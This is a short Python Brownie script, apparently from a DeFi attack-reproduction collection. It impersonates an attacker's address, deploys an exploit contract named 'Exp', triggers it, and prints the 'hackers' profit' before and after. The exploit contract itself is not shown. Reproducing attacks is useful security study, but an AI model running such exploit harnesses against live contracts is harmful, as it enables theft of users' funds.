from brownie import accounts, Exp
from rich import print as rp

def main():
    rp('[bold green]------------ Supremacy Inc. ------------[/]')
    rp('[bold green]------------- Web3.0 Rekt -------------[/]\n')
    hacker = accounts.at('0xc95C558dAA63b1A79331B2AB4a2a7af375384d3B', force=True)

    exp = Exp.deploy({
        'from': hacker
    })

    before = exp.profit()

    rp(f'🧛 [bold green] Amount of profit made by hackers before the attack: {before.return_value}')    

    exp.trigger({
        'from': hacker
    })

    after = exp.profit()

    rp(f'🧛 [bold green] Amount of profit made by hackers after the attack: {after.return_value / 1e6}')
